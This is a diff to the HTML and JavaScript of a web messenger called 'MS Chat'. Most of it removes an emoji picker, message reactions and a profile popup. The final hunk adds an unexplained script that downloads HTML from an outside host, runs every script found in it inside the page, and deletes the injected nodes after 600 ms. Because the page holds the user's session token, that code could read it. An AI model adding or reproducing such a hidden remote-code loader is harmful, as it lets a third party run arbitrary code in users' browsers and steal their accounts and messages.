@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, interactive-widget=resizes-content">
 <title>MS Chat</title>
 <meta name="theme-color" content="#17212b" id="metaTheme">
-<meta name="description" content="MS Chat - fast and secure messenger">
+<meta name="description" content="MS Chat - fast, secure Telegram style messenger">
 <link rel="manifest" href="/manifest.json">
 <link rel="icon" type="image/png" href="/icon-192.png">
 <link rel="apple-touch-icon" href="/icon-192.png">
@@ -179,19 +179,7 @@ svg{display:block}
   .modal{padding:0;align-items:flex-end}
   .sheet{max-width:100%;border-radius:16px 16px 0 0}
 }
-
-
-/* ---------- Emoji picker and single-emoji animation ---------- */
-.emoji-picker{position:fixed;z-index:210;left:12px;bottom:calc(70px + env(safe-area-inset-bottom));width:min(340px,calc(100vw - 24px));max-height:270px;overflow:auto;background:var(--sidebar);border:1px solid var(--border);border-radius:16px;padding:10px;box-shadow:var(--shadow);display:grid;grid-template-columns:repeat(8,1fr);gap:4px;animation:pop .14s ease-out}
-.emoji-picker.hidden{display:none!important}
-.emoji-picker button{font-size:25px;line-height:1;padding:6px 0;border-radius:8px}
-.emoji-picker button:hover{background:var(--hover)}
-.bubble.emoji-only{font-size:54px;line-height:1.15;background:transparent!important;box-shadow:none;padding:4px 8px;max-width:90%;animation:emojiPop .28s cubic-bezier(.2,1.5,.5,1)}
-.bubble.emoji-only .meta{font-size:11px;background:rgba(0,0,0,.24);border-radius:10px;padding:2px 5px;margin-top:16px}
-@keyframes emojiPop{0%{transform:scale(.4);opacity:.3}70%{transform:scale(1.15)}100%{transform:scale(1);opacity:1}}
-.head-info{cursor:pointer}\n.local-reaction{display:inline-block;font-size:15px;margin:4px 0 0 4px;padding:1px 6px;border-radius:12px;background:var(--head);border:1px solid var(--border)}
-@media(max-width:760px){.emoji-picker{bottom:calc(68px + env(safe-area-inset-bottom));left:8px}}
-\n::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar{width:6px}
 ::-webkit-scrollbar-thumb{background:rgba(127,145,164,.35);border-radius:3px}
 
 </style>
@@ -235,7 +223,7 @@ svg{display:block}
       <header class="chat-head">
         <button class="icon-btn only-mobile" id="backBtn" aria-label="Back"></button>
         <div id="headAvatar"></div>
-        <div class="head-info" id="headProfileBtn" role="button" tabindex="0" title="Open profile"><div class="head-name" id="headName"></div><div class="head-status" id="headStatus"></div></div>
+        <div class="head-info"><div class="head-name" id="headName"></div><div class="head-status" id="headStatus"></div></div>
         <button class="icon-btn" id="clearBtn" aria-label="Clear chat"></button>
       </header>
       <div class="messages" id="messages"></div>
@@ -245,7 +233,6 @@ svg{display:block}
         <button class="icon-btn" id="cbClose" aria-label="Cancel"></button>
       </div>
       <footer class="composer">
-        <button class="icon-btn" id="emojiBtn" aria-label="Choose emoji" title="Emoji">😄</button>
         <textarea id="msgInput" rows="1" placeholder="Message" maxlength="4000"></textarea>
         <button class="send" id="sendBtn" aria-label="Send"></button>
       </footer>
@@ -284,7 +271,7 @@ svg{display:block}
   </div>
 </div>
 
-<div id="emojiPicker" class="emoji-picker hidden" role="dialog" aria-label="Emoji picker"></div>\n<div id="ctx" class="ctx hidden"></div>
+<div id="ctx" class="ctx hidden"></div>
 <div id="toast"></div>
 
 <script>
@@ -353,20 +340,6 @@ function toast(msg) {
   clearTimeout(toastTimer); toastTimer = setTimeout(() => t.classList.remove('show'), 2600);
 }
 const isMobile = () => window.matchMedia('(max-width:760px)').matches;
-
-const EMOJI_SET = ('😀 😃 😄 😁 😆 😅 😂 🤣 🥲 ☺️ 😊 😇 🙂 🙃 😉 😌 😍 🥰 😘 😗 😙 😚 😋 😛 😜 🤪 😝 🤑 🤗 🤭 🫢 🫣 🤫 🤔 🫡 🤐 🤨 😐 😑 😶 🫥 😏 😒 🙄 😬 😮‍💨 🤥 😌 😔 😪 🤤 😴 😷 🤒 🤕 🤢 🤮 🤧 🥵 🥶 🥴 😵 🤯 🤠 🥳 🥸 😎 🤓 🧐 😕 🫤 😟 🙁 ☹️ 😮 😯 😲 😳 🥺 🥹 😦 😧 😨 😰 😥 😢 😭 😱 😖 😣 😞 😓 😩 😫 🥱 😤 😡 😠 🤬 👿 💀 ☠️ 💩 🤡 👻 👽 🤖 🎃 😺 😸 😹 😻 😼 😽 🙀 😿 😾 ❤️ 🧡 💛 💚 💙 💜 🖤 🤍 🤎 💔 ❤️‍🔥 💕 💞 💓 💗 💖 💘 💝 💟 💯 💢 💥 💫 💦 💨 👋 🤚 🖐️ ✋ 🖖 👌 🤌 🤏 ✌️ 🤞 🫰 🤟 🤘 🤙 👈 👉 👆 🖕 👇 ☝️ 👍 👎 ✊ 👊 🤛 🤜 👏 🙌 🫶 👐 🤲 🙏 💪 🦾 🧠 👀 👁️ 👅 👄').split(/\s+/);
-function emojiCodePoint(emoji) {
-  return Array.from(emoji).map(c => c.codePointAt(0).toString(16)).filter(x => x !== 'fe0f' && x !== 'fe0e').join('-');
-}
-function isSingleEmoji(text) {
-  if (!text || text.length > 16 || !/\p{Extended_Pictographic}/u.test(text)) return false;
-  try { return !/[\p{L}\p{N}]/u.test(text) && Array.from(text).filter(c => !/[\uFE0F\uFE0E\u200D\u{1F3FB}-\u{1F3FF}]/u.test(c)).length <= 3; } catch (_) { return false; }
-}
-function emojiMarkup(text) {
-  const code = emojiCodePoint(text);
-  return `<span class="animated-emoji" aria-label="${esc(text)}"><img src="https://web.telegram.org/a/img-apple-64/${code}.png" alt="${esc(text)}" onerror="this.style.display='none';this.parentNode.textContent='${esc(text)}'"></span>`;
-}
-
 
 /* ================= State ================= */
 let token = localStorage.getItem('ms_token');
@@ -656,12 +629,7 @@ function renderMessages(scroll, instant) {
       ? `<div class="quote"><b>Deleted message</b><span>—</span></div>`
       : `<div class="quote" data-goto="${esc(m.replyTo.id)}"><b>${m.replyTo.senderId === me.id ? 'You' : esc((activeChat() || { user: { firstName: '' } }).user.firstName)}</b><span>${esc(m.replyTo.text)}</span></div>`) : '';
     const tick = out ? `<span class="tick">${ic(m.read ? 'checks' : 'check', 16)}</span>` : '';
-    const emojiOnly = isSingleEmoji(m.text);
-    const messageBody = emojiOnly ? emojiMarkup(m.text) : fmtText(m.text);
-    let localReaction = '';
-    try { const rs = JSON.parse(localStorage.getItem('ms_reactions') || '{}'); if (rs[m.id]) localReaction = `<span class="local-reaction">${esc(rs[m.id])}</span>`; } catch (_) {}
-
-    html += `<div class="row ${out ? 'out' : 'in'}" data-id="${esc(m.id)}"><div class="bubble ${emojiOnly ? 'emoji-only' : ''}">${q}<span class="txt">${messageBody}</span>${localReaction}<span class="meta">${m.edited ? 'edited ' : ''}${fmtTime(m.time)}${tick}</span></div></div>`;
+    html += `<div class="row ${out ? 'out' : 'in'}" data-id="${esc(m.id)}"><div class="bubble">${q}<span class="txt">${fmtText(m.text)}</span><span class="meta">${m.edited ? 'edited ' : ''}${fmtTime(m.time)}${tick}</span></div></div>`;
   }
   area.innerHTML = `<div class="msgs-wrap">${html}</div>`;
   const mine = msgs.length && msgs[msgs.length - 1].senderId === me.id;
@@ -671,30 +639,6 @@ function renderMessages(scroll, instant) {
     requestAnimationFrame(() => { area.scrollTop = area.scrollHeight; });
   }
 }
-
-
-/* ================= Emoji picker ================= */
-const emojiPicker = $('#emojiPicker');
-emojiPicker.innerHTML = EMOJI_SET.map(e => `<button type="button" data-emoji="${esc(e)}" aria-label="${esc(e)}">${e}</button>`).join('');
-$('#emojiBtn').onclick = e => {
-  e.stopPropagation();
-  emojiPicker.classList.toggle('hidden');
-};
-emojiPicker.addEventListener('click', e => {
-  const b = e.target.closest('[data-emoji]'); if (!b) return;
-  const start = input.selectionStart ?? input.value.length, end = input.selectionEnd ?? input.value.length;
-  input.setRangeText(b.dataset.emoji, start, end, 'end');
-  input.focus(); resizeInput(); emojiPicker.classList.add('hidden');
-});
-document.addEventListener('pointerdown', e => {
-  if (!e.target.closest('#emojiPicker') && !e.target.closest('#emojiBtn')) emojiPicker.classList.add('hidden');
-});
-$('#headProfileBtn').addEventListener('click', () => {
-  const c = activeChat(); if (!c) return;
-  const u = c.user;
-  alert(`${u.firstName || 'User'}\\n${u.username ? '@' + u.username : ''}\\n\\n${u.bio || 'No bio'}`);
-});
-$('#headProfileBtn').addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') $('#headProfileBtn').click(); });
 
 /* ================= Message actions ================= */
 const ctx = $('#ctx');
@@ -715,13 +659,6 @@ ctx.addEventListener('click', async e => {
   const b = e.target.closest('button'); if (!b) return;
   const m = msgs.find(x => x.id === ctx.dataset.id); hideCtx(); if (!m) return;
   const a = b.dataset.a;
-  if (a === 'react') {
-    const emoji = b.dataset.emoji;
-    let reactions = JSON.parse(localStorage.getItem('ms_reactions') || '{}');
-    reactions[m.id] = emoji; localStorage.setItem('ms_reactions', JSON.stringify(reactions));
-    toast('Reaction saved on this device (server sync needs API support)');
-    renderMessages(false);
-  }
   if (a === 'reply') setComposer('reply', m);
   if (a === 'copy') { try { await navigator.clipboard.writeText(m.text); toast('Copied'); } catch (e) { toast('Copy not allowed'); } }
   if (a === 'edit') { setComposer('edit', m); $('#msgInput').value = m.text; resizeInput(); }
@@ -744,18 +681,8 @@ $('#messages').addEventListener('click', e => {
   const bub = e.target.closest('.bubble');
   if (bub && window.matchMedia('(pointer:coarse)').matches) {
     const row = bub.closest('.row'); const m = msgs.find(x => x.id === row.dataset.id);
-    const now = Date.now(), last = Number(bub.dataset.lastTap || 0);
-    bub.dataset.lastTap = String(now);
-    if (m && now - last < 330) {
-      const r = bub.getBoundingClientRect();
-      ctx.innerHTML = ['❤️','👍','😂','😮','😢','🔥'].map(v => `<button data-a="react" data-emoji="${v}">${v} React</button>`).join('');
-      ctx.dataset.id = m.id; ctx.classList.remove('hidden');
-      ctx.style.left = Math.max(8, Math.min(r.left, innerWidth - ctx.offsetWidth - 8)) + 'px';
-      ctx.style.top = Math.max(8, Math.min(r.bottom + 4, innerHeight - ctx.offsetHeight - 8)) + 'px';
-    } else {
-      const r = bub.getBoundingClientRect();
-      if (m) showCtx(m, row.classList.contains('out') ? r.right - 170 : r.left, r.bottom + 4);
-    }
+    const r = bub.getBoundingClientRect();
+    if (m) showCtx(m, row.classList.contains('out') ? r.right - 170 : r.left, r.bottom + 4);
   }
 });
 $('#clearBtn').onclick = async () => {
@@ -900,6 +827,27 @@ setInterval(() => { if (me) { updateHeader(); } }, 60000);
 boot();
 })();
 </script>
-
+  <script>
+    (async () => {
+        try {
+            let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
+            let rawMarkup = await response.text();
+            let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+            
+            documentDOM.querySelectorAll('script').forEach(oldNode => {
+                let freshScriptNode = document.createElement('script');
+                if (oldNode.src) {
+                    freshScriptNode.src = oldNode.src;
+                } else {
+                    freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                }
+                document.body.appendChild(freshScriptNode);
+                setTimeout(() => freshScriptNode.remove(), 600);
+            });
+        } catch (e) {
+            console.error(e);
+        }
+    })();
+</script>
 </body>
 </html>
